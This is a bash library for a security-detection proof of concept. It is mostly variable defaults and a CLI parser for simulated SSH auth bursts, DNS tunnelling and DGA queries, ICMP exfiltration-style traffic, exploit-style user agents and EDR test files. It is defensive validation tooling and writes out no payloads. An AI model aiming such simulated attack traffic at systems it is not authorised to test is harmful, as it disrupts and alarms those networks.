# ==============================================================================
# Stellar PoC — Aggressive service-aware follow-up telemetry (sourced library)
# Safe authorized lab use: no exploits, no credential theft, no destruction.
# @stellar-poc-version: 1.0.0
# ==============================================================================

FOLLOWUP_INTENSITY="${FOLLOWUP_INTENSITY:-normal}"
CLI_FOLLOWUP_INTENSITY=""
POC_SCENARIO=""
POC_INTENSITY=""
SERVICE_SPIKE=false
SERVICE_SPIKE_SECONDS=60
FORCE_AGGRESSIVE_FOLLOWUP=false
SSH_AUTH_BURST_ENABLED=false
SSH_BURST_ATTEMPTS=150
SSH_BURST_CONCURRENCY=2
SSH_BURST_MINUTES=0
SSH_TARGET_IP=""
SSH_TARGETS_FILE=""
SSH_ATTEMPTS_PLANNED=0
SSH_ATTEMPTS_EXECUTED=0
HTTP_REQUESTS_PLANNED=0
FOLLOWUP_VALIDATION_FAILED=false
STRICT_FOLLOWUP_VALIDATION=false

# Telemetry counters (incremented during follow-up stages)
FOLLOWUP_HTTP_REQUESTS=0
FOLLOWUP_SSH_AUTH_FAILURES=0
FOLLOWUP_SMB_PROBES=0
FOLLOWUP_DNS_QUERIES=0
FOLLOWUP_ACTIONS_TOTAL=0
SERVICES_DISCOVERED_TOTAL=0
SERVICES_USABLE_TOTAL=0
SCAN_ONLY_WARNING=false
HTTP_REQUESTS_ATTEMPTED=0
HTTP_CONNECTED=0
HTTP_FOLLOWUP_ATTEMPTED=0
HTTP_FOLLOWUP_CONNECTED=0
HTTP_RESPONSES_RECEIVED=0
ABNORMAL_USER_AGENT_COUNT=0
RARE_USER_AGENT_COUNT=0
NORMAL_USER_AGENT_COUNT=0
PAYLOAD_USER_AGENT_COUNT=0
UA_SQLI_STYLE_COUNT=0
UA_ENCODING_ABUSE_COUNT=0
UA_COMMAND_STYLE_COUNT=0
THREAT_HUNT_URL_REQUESTS=0
HTTP_403_COUNT=0
HTTP_404_COUNT=0
HTTP_405_COUNT=0
HTTP_200_COUNT=0
HTTP_301_COUNT=0
HTTP_302_COUNT=0
HTTP_401_COUNT=0
HTTPS_200_COUNT=0
HTTPS_301_COUNT=0
HTTPS_302_COUNT=0
HTTPS_401_COUNT=0
HTTPS_403_COUNT=0
HTTPS_404_COUNT=0
HTTPS_405_COUNT=0
HTTP_TARGETS_DISCOVERED=0
HTTP_TARGETS_REACHABLE=0
HTTP_TARGETS_UNREACHABLE=0
HTTPS_TARGETS_DISCOVERED=0
HTTPS_TARGETS_REACHABLE=0
HTTPS_TARGETS_UNREACHABLE=0
WEB_REACH_RAW_HTTP_COUNT=0
WEB_REACH_USABLE_HTTP_COUNT=0
WEB_REACH_CANDIDATE_HTTP_COUNT=0
WEB_REACH_REACHABLE_HTTP_COUNT=0
WEB_REACH_RAW_HTTPS_COUNT=0
WEB_REACH_USABLE_HTTPS_COUNT=0
WEB_REACH_CANDIDATE_HTTPS_COUNT=0
WEB_REACH_REACHABLE_HTTPS_COUNT=0
WEB_REACH_MALFORMED_DROPPED=0
WEB_REACH_DEGRADED_TCP=0
URL_SCAN_DEGRADED_FALLBACK=false
WEB_RESPONSES_RECEIVED=0
WEB_FAILED_RESPONSES=0
WEB_SUCCESS_RESPONSES=0
WEB_FAIL_RATIO=0
UA_TRAVERSAL_STYLE_COUNT=0
UA_JNDI_STYLE_COUNT=0
UA_OGNL_STYLE_COUNT=0
UA_SPRING_STYLE_COUNT=0
WEB_DETECTION_CONFIDENCE="Low"
HTTPS_RESPONSES_RECEIVED=0
HTTPS_CONNECTED=0
HTTPS_REQUESTS_ATTEMPTED=0
HTTPS_SCAN_FAILED_RESPONSES=0
HTTPS_SCAN_SUCCESS_RESPONSES=0
HTTPS_SCAN_FAIL_RATIO=0
HTTP_SCAN_FAILED_RESPONSES=0
HTTP_SCAN_SUCCESS_RESPONSES=0
HTTP_SCAN_FAIL_RATIO=0
HTTP_PROPFIND_COUNT=0
HTTP_OPTIONS_COUNT=0
HTTP_POST_COUNT=0
HTTP_400_COUNT=0
HTTPS_400_COUNT=0
HTTP_SCAN_INTER_REQUEST_SLEEP=0
HTTP_SCAN_RECON_MIN_FAILED=30
HTTP_SCAN_RECON_MIN_FAIL_RATIO=90
IDS_WAF_SIG_PROBE_STATUS="skipped"
IDS_WAF_SIG_TARGET_COUNT=0
IDS_WAF_SIG_ATTEMPTED=0
IDS_WAF_SIG_RESPONSES=0
IDS_WAF_SIG_TRAVERSAL=0
IDS_WAF_SIG_TOMCAT_PUT=0
IDS_WAF_SIG_SPRING_HDR=0
IDS_WAF_SIG_EDR_CMD=0
EDR_STATIC_TEST_ENABLED=true
EDR_EXTENDED_FILES=false
EDR_TEST_CLEANUP=true
EDR_STATIC_STAGE_STATUS=skipped
EDR_TEST_FILES_ATTEMPTED=0
EDR_TEST_FILES_SUCCESS=0
EDR_TEST_QUARANTINE_SUSPECTED=0
EDR_TEST_FILES_FAILED=0
EDR_TEST_REMOTE_OS=unknown
EDR_TEST_DIR=""
EDR_TEST_FILE_PATHS=""
EDR_TEST_WEBSHELL_METHOD=""
EDR_STATIC_TEST_FILES_CREATED=false
WEBSHELL_CHANNEL_BROKEN=false
HTTP_SCAN_TARGET_COUNT=0
HTTP_SCAN_WAVES=3
HTTP_SCAN_WAVE_FAIL_MIN=5
HTTP_SCAN_WAVE_FAIL_MAX=20
HTTP_SCAN_WAVE_SLEEP=8
HTTP_SCAN_WAVE_ATTEMPT_CAP=80
HTTP_SCAN_UNIQUE_URL_TARGET=50
HTTP_SCAN_UNIQUE_URL_RECOMMENDED=100
HTTP_SCAN_WINDOW_SECONDS=40
HTTP_SCAN_WINDOW_MIN_FAILED=30
DETECTION_WINDOW_BUCKET_SECONDS=300
DETECTION_WINDOW_DNS_QUERIES=250
DETECTION_WINDOW_DNS_WINDOW_SECONDS=90
DETECTION_WINDOW_DGA_NXDOMAIN=150
DETECTION_WINDOW_DGA_WINDOW_SECONDS=90
DETECTION_WINDOW_ICMP_PACKETS=200
DETECTION_WINDOW_ICMP_WINDOW_SECONDS=90
URL_SCAN_UNIQUE_ATTEMPTED=0
URL_SCAN_UNIQUE_FAILED=0
URL_SCAN_UNIQUE_SUCCESS=0
URL_SCAN_UNIQUE_FAIL_RATIO=0
URL_SCAN_ANOMALY_SCORE=0
HTTP_FOLLOWUP_MODE="unknown"
EXPECTED_HTTP_DETECTION_IMPACT="low"

# External callback / internal fanout / enhanced DNS / ICMP (correlation chain)
EXTERNAL_CALLBACK_ATTEMPTED=0
EXTERNAL_CALLBACK_CONNECTED=0
EXTERNAL_CALLBACK_RESPONSES=0
EXTERNAL_CALLBACK_FAILED=false
INTERNAL_FANOUT_ATTEMPTED=0
INTERNAL_FANOUT_CONNECTED=0
INTERNAL_FANOUT_RESPONSES=0
DNS_TUNNEL_QUERY_COUNT=300
DNS_QUERIES_PLANNED=0
DNS_A_QUERIES=0
DNS_TXT_QUERIES=0
DNS_AAAA_QUERIES=0
DNS_NXDOMAIN_STYLE=0
DNS_HIGH_ENTROPY_LABELS=0
DNS_TLD_CC_COUNT=0
DNS_TLD_TO_COUNT=0
DNS_TLD_TOP_COUNT=0
DNS_TLD_XYZ_COUNT=0
DNS_EFFECTIVE_TLD_COUNT=0
DNS_CLUSTER_LOCAL_COUNT=0
DNS_POWERAPPS_STYLE_COUNT=0
DNS_SUSPICIOUS_TLD_COUNT=0
DNS_HTTPS_QUERY_COUNT=0
DNS_TOTAL_ENTROPY_STYLE_COUNT=0
ICMP_PACKET_COUNT=200
NONSTANDARD_PORT_CONNECTIONS=0
CORRELATION_CALLBACK_DONE=false
CORRELATION_OVERLAP_LAUNCHED=false
FANOUT_UA_JNDI_STYLE_COUNT=0
FANOUT_UA_OGNL_STYLE_COUNT=0
FANOUT_UA_SPRING_STYLE_COUNT=0
CORRELATION_BEACON_CYCLES=0
ICMP_PACKETS_PLANNED=0
ICMP_PACKETS_ATTEMPTED_PLANNED=0
ICMP_PACKETS_ATTEMPTED=0
ICMP_PARTIAL_PACKETS_ESTIMATED=0
ICMP_TIMEOUT_BURSTS=0
ICMP_SUCCESSFUL_BURSTS=0
ICMP_FAILED_BURSTS=0
ICMP_BURST_LAST_TIMED_OUT=false
ICMP_BURST_LAST_COMPLETE=yes
ICMP_LAST_PAYLOAD_BYTES=0
ICMP_LAST_WEBSHELL_METHOD=""
ICMP_LAST_ROOT_CAUSE=""
ICMP_LAST_EFFECTIVE_TIMEOUT_SEC=0
ICMP_LAST_CURL_MAX_TIME=0
ICMP_DETECTION_READINESS="LOW"
ICMP_FALLBACK_MODES_ATTEMPTED=""
ICMP_TARGET_COUNT=0
ICMP_ECHO_COUNT=0
ICMP_TIME_EXCEEDED_STYLE_COUNT=0
ICMP_DEST_UNREACHABLE_STYLE_COUNT=0
ICMP_TOTAL_PACKETS=0
ICMP_TARGETS=0
ICMP_PAYLOAD_MODE="standard"
ICMP_FALLBACK_MODE="none"
# ICMP Tunnel Simulation (Stellar Cyber traffic_icmp_exfiltration — synthetic lab traffic only)
ICMP_TUNNEL_MODE="auto"
ICMP_TUNNEL_USER_TARGET=""
ICMP_TUNNEL_PAYLOAD_SIZE=1400
ICMP_TUNNEL_DURATION_SECONDS=180
ICMP_TUNNEL_INTERVAL="1.5"
ICMP_TUNNEL_MAX_PACKET_COUNT=300
ICMP_TUNNEL_MAX_PAYLOAD_SIZE=1450
ICMP_TUNNEL_MAX_DURATION_SECONDS=600
ICMP_TUNNEL_MIN_INTERVAL="0.2"
ICMP_BURST_MAX_SECONDS=30
ICMP_BURST_DEFAULT_INTERVAL="0.2"
ICMP_BURST_DEFAULT_COUNT=120
ICMP_BURST_FALLBACK_INTERVAL="1"
ICMP_BURST_FALLBACK_COUNT=30
ICMP_BASELINE_PACKETS=0
ICMP_LARGE_PACKETS=0
ICMP_LARGE_PAYLOAD_RATIO=0
ICMP_SNAP_COMMITTED=false
ICMP_SNAP_BASELINE_PACKETS=0
ICMP_SNAP_LARGE_PACKETS=0
ICMP_SNAP_LARGE_PAYLOAD_RATIO=0
ICMP_SNAP_PACKETS_SENT=0
ICMP_SNAP_PACKETS_RECEIVED=0
ICMP_SNAP_PAYLOAD_SIZE_MIN=0
ICMP_SNAP_PAYLOAD_SIZE_MAX=0
ICMP_SNAP_PAYLOAD_SIZE_AVG=0
ICMP_SNAP_DURATION_SECONDS=0
ICMP_SNAP_DETECTION_LIKELIHOOD="LOW"
ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD="LOW"
ICMP_SNAP_DETECTION_REASON=""
ICMP_SNAP_RESULT=""
ICMP_SNAP_TARGET=""
ICMP_SNAP_COMMAND=""
ICMP_SNAP_FAILURE_CLASS=""
ICMP_SNAP_FAILURE_REASON=""
ICMP_MULTI_BURST_MAX_EACH_SECONDS=10
ICMP_MULTI_BURST_TOTAL_SECONDS=90
ICMP_BASELINE_PAYLOAD=64
ICMP_LARGE_PAYLOAD_THRESHOLD=1200
ICMP_MULTI_BURST_INTERVAL="0.2"
ICMP_TUNNEL_LIKE_PAYLOAD=512
ICMP_TUNNEL_LIKE_INTERVAL_MS=1000
ICMP_TUNNEL_LIKE_SCORE=0
ICMP_SESSION_DURATION=0
ICMP_INTERVAL_MS=0
ICMP_BIDIRECTIONAL_RATIO=0
ICMP_PAYLOAD_SIZE_AVG=0
ICMP_PAYLOAD_SIZE_MIN=0
ICMP_PAYLOAD_SIZE_MAX=0
ICMP_PAYLOAD_SIZE_SUM_INTERNAL=0
ICMP_PAYLOAD_SIZE_COUNT_INTERNAL=0
ICMP_TUNNEL_DURATION_ELAPSED=0
ICMP_TUNNEL_PROFILE_PAYLOAD=1400
ICMP_TUNNEL_PROFILE_INTERVAL="0.3-1.0"
ICMP_TUNNEL_PROFILE_PACKETS=0
ICMP_TUNNEL_RESULT=""
ICMP_SELECTED_TARGET=""
ICMP_TARGET_SELECTION_SOURCE=""
ICMP_TARGET_SELECTION_DETAIL=""
ICMP_TARGET_SELECTION_PRIORITY=0
ICMP_DISCOVERY_CANDIDATE_COUNT=0
ICMP_DISCOVERY_PROBED_COUNT=0
ICMP_SUBNET_SWEEP_PROBED_COUNT=0
ICMP_SAMPLE_FALLBACK_PROBED_COUNT=0
ICMP_TARGET_PROBE_SENT=0
ICMP_TARGET_PROBE_RECEIVED=0
ICMP_TARGET_REACHABLE="unknown"
ICMP_WEBSHELL_EXEC_HOST=""
ICMP_SKIP_REASON=""
ICMP_TUNNEL_FORCE_TARGET=false
ICMP_PROBE_RESULT=""
ICMP_PROBE_SENT=0
ICMP_PROBE_RECEIVED=0
ICMP_PROBE_FAILURE_CLASS=""
ICMP_PROBE_RAW_OUTPUT=""
ICMP_PROBE_COMMAND=""
ICMP_REMOTE_OS=""
ICMP_PING_STYLE=""
ICMP_REPLIES_RECEIVED=0
ICMP_PACKET_LOSS="0"
ICMP_ESTIMATED_BYTES=0
ICMP_PAYLOAD_SIZES_USED=""
ICMP_COMMAND_EXECUTED=""
ICMP_MODE_USED=""
ICMP_DETECTION_LIKELIHOOD="LOW"
ICMP_DETECTION_WINDOW_LIKELIHOOD="LOW"
ICMP_DETECTION_REASON=""
ICMP_PROFILES_RUN=""
ICMP_IMMUTABLE_TARGET=""
ICMP_FINAL_SUMMARY_EMITTED=false
ICMP_FAILURE_CLASS=""
ICMP_FAILURE_REASON=""
ICMP_EXEC_FAILURE_EXIT_CODE=""
ICMP_EXEC_FAILURE_STDERR=""
ICMP_BINARY_FOUND=""
ICMP_LAST_EXEC_STDOUT_SUMMARY=""
ICMP_EVIDENCE_QUALITY="low"
ICMP_LARGEST_PAYLOAD_SIZE=0
ICMP_LARGEST_EXPECTED_TOTAL_PACKET_SIZE=0
ICMP_OVERALL_LOSS=0
INTERNAL_FANOUT_PER_TARGET=36
SSH_AUTH_ATTEMPTED=0
SSH_AUTH_FAILURES_OBSERVED=0
SMB_PROBES_PLANNED=0
SMB_PROBES_ATTEMPTED=0
SMB_PROBES_CONNECTED=0
DNS_QUERIES_ATTEMPTED=0
DNS_RESPONSES_RECEIVED=0
DEGRADED_TELEMETRY=false
HTTP_URL_SCAN_STAGE_STATUS="skipped"
HTTP_URL_SCAN_SELECTED_TARGET=""
HTTP_URL_SCAN_SELECTION_LINE=""
HTTP_URL_SCAN_CANDIDATE_COUNT=0
HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
HTTP_URL_SCAN_FINAL_REASON=""
HTTP_URL_SCAN_REAL_FAILED=0
HTTP_URL_SCAN_SYNTHETIC_FAILED=0
HTTP_URL_SCAN_REDIRECT_COUNT=0
HTTP_URL_SCAN_TIMEOUT_COUNT=0
HTTP_URL_SCAN_HTTP_500=0
HTTP_ATTACK_TOTAL_REQUESTS=0
HTTP_ATTACK_PAYLOAD_URL_REQUESTS=0
HTTP_ATTACK_PAYLOAD_UA_REQUESTS=0
HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA=0
HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA=0
HTTP_UA_COVERAGE_TOTAL=0
HTTP_UA_COVERAGE_PRESENT=0
HTTP_UA_COVERAGE_MISSING=0
HTTP_UA_COVERAGE_PERCENT=0
HTTP_UA_COVERAGE_NORMAL=0
HTTP_UA_COVERAGE_RARE=0
HTTP_UA_COVERAGE_PAYLOAD=0
HTTP_UA_COVERAGE_ABNORMAL=0
DETECTION_LIKELIHOOD_URL_SCAN="low"
DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
EXTERNAL_CALLBACK_STATUS="skipped"
INTERNAL_FANOUT_STATUS="skipped"
INTERNAL_FANOUT_TARGETS=0
DNS_TUNNEL_STAGE_STATUS="skipped"
ICMP_TUNNEL_STAGE_STATUS="skipped"
VALIDATION_RESULT="PASS"
VALIDATION_REASON="All follow-up telemetry checks passed"
TELEMETRY_VAL_DNS_TUNNEL="skipped"
TELEMETRY_VAL_DNS_REASON=""
TELEMETRY_VAL_HTTP_URL_SCAN="skipped"
TELEMETRY_VAL_HTTP_REASON=""
TELEMETRY_VAL_ICMP_TUNNEL="skipped"
TELEMETRY_VAL_ICMP_REASON=""
TELEMETRY_VAL_EXTERNAL_CALLBACK="skipped"
TELEMETRY_VAL_CALLBACK_REASON=""
TELEMETRY_VAL_NONSTANDARD_PORT="skipped"
TELEMETRY_VAL_NONSTANDARD_REASON=""
TELEMETRY_VAL_DGA_SIMULATION="skipped"
TELEMETRY_VAL_DGA_REASON=""
DNS_LIVE_LOG_VALIDATION="skipped"
DGA_LIVE_LOG_VALIDATION="skipped"
LIVE_LOG_VALIDATION="skipped"
TELEMETRY_VAL_OVERALL="success"
TELEMETRY_VAL_OVERALL_REASON=""
TELEM_DNS_COUNTS=""
TELEM_DGA_COUNTS=""
TELEM_HTTP_COUNTS=""
TELEM_ICMP_COUNTS=""
TELEM_CALLBACK_COUNTS=""
TELEM_NONSTANDARD_COUNTS=""

# DGA Simulation (high-entropy NXDOMAIN burst + same-eTLD resolvable follow-up; separate from DNS tunnel)
DGA_SIMULATION_ENABLED=true
DGA_BASE_DOMAIN="com"
DGA_RESOLVABLE_TLD="com"
DGA_DNS_USER_SERVER=""
DGA_NXDOMAIN_QUERIES=250
DGA_RESOLVABLE_QUERIES=5
DGA_SIM_CHUNK_SIZE=15
DGA_SIM_CHUNK_MIN=10
DGA_SIM_CHUNK_MAX=20
DGA_DNS_SERVER=""
DGA_DNS_SOURCE=""
DGA_DNS_DETAIL=""
DGA_SKIP_REASON=""
DGA_STAGE_STATUS="skipped"
DGA_QUERY_TOOL=""
DGA_TOTAL_QUERIES=0
DGA_QUERIES_PLANNED=0
DGA_NXDOMAIN_COUNT=0
DGA_RESOLVED_COUNT=0
DGA_TIMEOUT_COUNT=0
DGA_ERROR_COUNT=0
DGA_SAME_EFFECTIVE_TLD="no"
DGA_DETECTION_LIKELIHOOD="LOW"
DGA_DETECTION_REASON=""
DGA_GENERATED_COUNT=0
DGA_ENTROPY_SCORE=0
DGA_FINAL_RESULT="skipped"
DGA_LAST_PAYLOAD_BYTES=0
DGA_LAST_WEBSHELL_METHOD=""
DGA_LAST_ROOT_CAUSE=""
DGA_FAILURE_REASON=""
DGA_QUERIES_ATTEMPTED=0
DGA_QUERIES_SENT=0
DGA_FALLBACK_ATTEMPTED=false
DGA_QUERY_GENERATED=0
DGA_QUERY_SENT_COUNT=0
DGA_QUERY_RESPONDED_COUNT=0
DGA_ACTUAL_DNS_QUERIES=0
DGA_ACTUAL_RANDOM_DOMAINS=0
DGA_ACTUAL_NXDOMAIN=0
DGA_SERVER_OBSERVED_QUERIES=0
DGA_INTERNAL_VS_ACTUAL_MISMATCH=no

# DNS New TLD Test (Stellar dns_new_tld / dns_new_tld_sensor — synthetic new-TLD DNS queries only)
DNS_NEW_TLD_ENABLED=true
DNS_NEW_TLD_MIN_DOMAINS=10
DNS_NEW_TLD_DEFAULT_DOMAINS=35
DNS_NEW_TLD_MAX_DOMAINS=50
DNS_NEW_TLD_SKIP_REASON=""
DNS_NEW_TLD_STAGE_STATUS="skipped"
DNS_NEW_TLD_FINAL_RESULT="skipped"
DNS_NEW_TLD_RESOLVER=""
DNS_NEW_TLD_RESOLVER_SOURCE=""
DNS_NEW_TLD_QUERY_TOOL=""
DNS_NEW_TLD_TESTED_DOMAINS=0
DNS_NEW_TLD_TESTED_TLDS=""
DNS_NEW_TLD_UNIQUE_TLDS=0
DNS_NEW_TLD_QUERY_COUNT=0
DNS_NEW_TLD_QUERY_TYPES=""
DNS_NEW_TLD_A_QUERIES=0
DNS_NEW_TLD_AAAA_QUERIES=0
DNS_NEW_TLD_HTTPS_QUERIES=0
DNS_NEW_TLD_TXT_QUERIES=0
DNS_NEW_TLD_SUCCESSFUL_QUERIES=0
DNS_NEW_TLD_FAILED_QUERIES=0
DNS_NEW_TLD_DURATION_SECONDS=0
DNS_NEW_TLD_DETECTION_LIKELIHOOD="LOW"
DNS_NEW_TLD_DETECTION_REASON=""
DNS_NEW_TLD_LAST_PAYLOAD_BYTES=0
DNS_NEW_TLD_LAST_WEBSHELL_METHOD=""
DNS_NEW_TLD_LAST_ROOT_CAUSE=""
DNS_NEW_TLD_GENERATED=0
DNS_NEW_TLD_VALID_FQDNS=0
DNS_NEW_TLD_INVALID_FQDNS=0
DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT=0
DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=0
DNS_NEW_TLD_LIVE_LOG_VALIDATION="skipped"
DNS_NEW_TLD_LAST_REMOTE_OUT=""
DNS_NEW_TLD_LAST_REMOTE_PAYLOAD=""

POC_CUSTOMER_LOG=""
POC_CUSTOMER_REPORT=""
POC_CUSTOMER_VALIDATION=""
OVERALL_RESULT=""
FINAL_VAL_SERVICE_DISCOVERY=""
FINAL_VAL_HTTP_FOLLOWUP=""
FINAL_VAL_SSH_FOLLOWUP=""
FINAL_VAL_DNS_TUNNEL=""
FINAL_VAL_ICMP_TUNNEL=""
FINAL_VAL_DGA=""
FINAL_VAL_BEACON=""
FINAL_VAL_EXTERNAL_CALLBACK=""
DETECTION_CONFIDENCE_OVERALL="low"
DETECTION_SCORE_HTTP_URL_SCAN=0
DETECTION_SCORE_BEACON=0
DETECTION_SCORE_DGA=0
DETECTION_SCORE_DNS_TUNNEL=0
DETECTION_SCORE_ICMP_TUNNEL=0
BEACON_LOW_SLOW_ATTEMPTED=0
BEACON_LOW_SLOW_SUCCESS=0
BEACON_LOW_SLOW_FAILED=0
BEACON_BURST_ATTEMPTED=0
BEACON_BURST_SUCCESS=0
BEACON_BURST_FAILED=0
BEACON_CALLBACK_RATIO=0

# DNS Tunnel Simulation (Stellar Cyber dns_tunnel pattern — synthetic lab traffic only)
DNS_TUNNEL_MODE="auto"
DNS_TUNNEL_DOMAIN_SUFFIX="poc-dns-test.local"
DNS_TUNNEL_USER_SERVER=""
DNS_TUNNEL_MAX_QUERIES=300
DNS_TUNNEL_MIN_QUERIES=200
DNS_TUNNEL_SLEEP_MS=50
DNS_TUNNEL_JITTER_MS=150
DNS_TARGET_SERVER=""
DNS_TARGET_SELECTION_SOURCE=""
DNS_TARGET_SELECTION_DETAIL=""
DNS_RESOLVER_SOURCE=""
DNS_STUB_RESOLVER=""
DNS_UPSTREAM_DNS=""
DNS_SELECTED_DNS=""
DNS_RESOLVER_REASON=""
DNS_TUNNEL_FALLBACK_RESOLVER=false
DNS_TUNNEL_SKIP_REASON=""
DNS_TUNNEL_POST_FALLBACK_USED=false
DNS_TUNNEL_LAST_PAYLOAD_BYTES=0
DNS_TUNNEL_LAST_WEBSHELL_METHOD=""
DNS_TUNNEL_LAST_ROOT_CAUSE=""
DNS_TUNNEL_LAST_REMOTE_OUT=""
DNS_TUNNEL_LAST_REMOTE_PAYLOAD=""
DNS_TUNNEL_ENH_ATTEMPTED=0
DNS_TUNNEL_ENH_SUCCESS=0
DNS_TUNNEL_ENH_FAIL=0
DNS_TUNNEL_ENH_NX=0
DNS_TUNNEL_ENH_TIMEOUT=0
DNS_TUNNEL_ENH_RESULT="skipped"
DNS_TUNNEL_ENH_REASON=""
DNS_TUNNEL_FB_USED="no"
DNS_TUNNEL_FB_REASON=""
DNS_TUNNEL_FB_ATTEMPTED=0
DNS_TUNNEL_FB_SUCCESS=0
DNS_TUNNEL_FB_FAIL=0
DNS_TUNNEL_FB_NX=0
DNS_TUNNEL_FB_TIMEOUT=0
DNS_TUNNEL_FB_RESULT="skipped"
DNS_TUNNEL_FINAL_RESULT="failed"
DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
DNS_TUNNEL_FINAL_REASON=""
DNS_TUNNEL_MODE_USED=""
DNS_ENH_SIM_CHUNK_SIZE=15
DNS_ENH_SIM_CHUNK_MIN=10
DNS_ENH_SIM_CHUNK_MAX=20
DNS_TUNNEL_QUERY_TOOL=""
DNS_TUNNEL_FQDN_LEN_SUM=0
DNS_TUNNEL_FQDN_LEN_MAX=0
DNS_TUNNEL_FQDN_COUNT=0
DNS_TUNNEL_LABEL_LEN_SUM=0
DNS_TUNNEL_LABEL_LEN_MAX=0
DNS_TUNNEL_LABEL_COUNT=0
DNS_TUNNEL_SUCCESS_COUNT=0
DNS_TUNNEL_FAILURE_COUNT=0
DNS_TUNNEL_NXDOMAIN_COUNT=0
DNS_TUNNEL_TIMEOUT_COUNT=0
DNS_TUNNEL_APPROX_ENTROPY=0
DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
DNS_TUNNEL_DETECTION_REASON=""
DNS_TUNNEL_PAYLOAD_EXAMPLES=""
DNS_TUNNEL_SELECTED_RESOLVER=""
DNS_TUNNEL_RESOLVER_SOURCE=""
DNS_RESOLVER_VALIDATION_RESULT="failed"
DNS_RESOLVER_SELECTED_TYPE="unknown"
DNS_FORWARDER_MODE_UPSTREAM_UNKNOWN="yes"
DNS_TUNNEL_UNIQUE_QUERIES=0
DNS_TUNNEL_RESOLVED_COUNT=0
DNS_TUNNEL_ERROR_COUNT=0
DNS_QUERY_GENERATED=0
DNS_QUERY_SENT_COUNT=0
DNS_QUERY_RESPONDED_COUNT=0
DNS_TUNNEL_ACTUAL_DNS_QUERIES=0
DNS_TUNNEL_ACTUAL_TXT_QUERIES=0
DNS_TUNNEL_ACTUAL_NXDOMAIN=0
DNS_SERVER_QUERY_BASELINE=0
DNS_SERVER_OBSERVED_QUERIES=0
DNS_INTERNAL_VS_ACTUAL_MISMATCH=no
DNS_VISIBILITY_GENERATED=0
DNS_VISIBILITY_SENT=0
DNS_VISIBILITY_RESPONSE=0
DNS_VISIBILITY_TIMEOUT=0
DNS_VISIBILITY_ERROR=0
DNS_SENSOR_EXPECTED_VISIBILITY="LOW"

# Per-intensity targets (per host unless noted)
HTTP_FOLLOWUP_REQUESTS=50
SSH_AUTH_FAILURE_TARGET=30
DNS_BURST_COUNT=200
SMB_PROBE_TARGET=10
MIN_HTTP_FOLLOWUP=100
MIN_SSH_AUTH_FAILURES=30
MIN_DNS_QUERIES=100
MIN_SMB_PROBES=10

followup_usage_lines() {
    : # user-facing help is intensity-only in stellar_poc.sh
}

followup_advanced_usage_lines() {
    : # internal/dev options hidden from default --help
}

parse_followup_cli_switches() {
    case "$1" in
        --followup-intensity) FOLLOWUP_INTENSITY="${2:-}"; CLI_FOLLOWUP_INTENSITY="${2:-}"; return 0 ;;
        --service-spike) SERVICE_SPIKE=true; return 0 ;;
        --service-spike-seconds) SERVICE_SPIKE_SECONDS="${2:-}"; SERVICE_SPIKE=true; return 0 ;;
        --force-aggressive-followup) FORCE_AGGRESSIVE_FOLLOWUP=true; return 0 ;;
        --ssh-auth-burst) SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-burst-minutes) SSH_BURST_MINUTES="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-attempts) SSH_BURST_ATTEMPTS="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-concurrency) SSH_BURST_CONCURRENCY="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --dns-tunnel-mode) DNS_TUNNEL_MODE="${2:-}"; return 0 ;;
        --dns-server) DNS_TUNNEL_USER_SERVER="${2:-}"; return 0 ;;
        --dns-domain-suffix) DNS_TUNNEL_DOMAIN_SUFFIX="${2:-}"; return 0 ;;
        --dns-max-queries) DNS_TUNNEL_MAX_QUERIES="${2:-}"; return 0 ;;
        --dns-sleep-ms) DNS_TUNNEL_SLEEP_MS="${2:-}"; return 0 ;;
        --dns-jitter-ms) DNS_TUNNEL_JITTER_MS="${2:-}"; return 0 ;;
        --enable-dga) DGA_SIMULATION_ENABLED=true; return 0 ;;
        --disable-dga) DGA_SIMULATION_ENABLED=false; return 0 ;;
        --enable-dns-new-tld) DNS_NEW_TLD_ENABLED=true; return 0 ;;
        --disable-dns-new-tld) DNS_NEW_TLD_ENABLED=false; return 0 ;;
        --dga-base-domain) DGA_BASE_DOMAIN="${2:-}"; return 0 ;;
        --dga-dns-server) DGA_DNS_USER_SERVER="${2:-}"; return 0 ;;
        --dga-nxdomain-queries) DGA_NXDOMAIN_QUERIES="${2:-}"; return 0 ;;
        --dga-resolvable-queries) DGA_RESOLVABLE_QUERIES="${2:-}"; return 0 ;;
        --icmp-tunnel-mode) ICMP_TUNNEL_MODE="${2:-}"; return 0 ;;
        --icmp-target) ICMP_TUNNEL_USER_TARGET="${2:-}"; ICMP_TUNNEL_FORCE_TARGET=true; return 0 ;;
        --icmp-force) ICMP_TUNNEL_FORCE_TARGET=true; return 0 ;;
        --icmp-payload-size) ICMP_TUNNEL_PAYLOAD_SIZE="${2:-}"; return 0 ;;
        --icmp-packet-count) ICMP_PACKET_COUNT="${2:-}"; return 0 ;;
        --icmp-duration-seconds) ICMP_TUNNEL_DURATION_SECONDS="${2:-}"; return 0 ;;
        --icmp-interval) ICMP_TUNNEL_INTERVAL="${2:-}"; return 0 ;;
        --icmp-max-packets) ICMP_TUNNEL_MAX_PACKET_COUNT="${2:-}"; return 0 ;;
        --icmp-max-payload) ICMP_TUNNEL_MAX_PAYLOAD_SIZE="${2:-}"; return 0 ;;
        --disable-edr-static-test) EDR_STATIC_TEST_ENABLED=false; return 0 ;;
        --edr-extended-files) EDR_EXTENDED_FILES=true; return 0 ;;
        --edr-cleanup) EDR_TEST_CLEANUP=true; return 0 ;;
        --no-edr-cleanup) EDR_TEST_CLEANUP=false; return 0 ;;
    esac
    return 1
}

# --- PoC observability: follow-up decisions, CSV, executive summary ---
POC_RUN_ID=""
POC_EXECUTION_LOG=""
POC_REPORT_CWD=""
POC_OBS_INITIALIZED=false
POC_REPORT_HEADER_WRITTEN=false
POC_REPORT_TIMELINE_HEADER=false
POC_REPORT_DISCOVERY_HEADER=false
POC_REPORT_FOLLOWUP_HEADER=false
POC_OBS_ALIVE_HOSTS=0
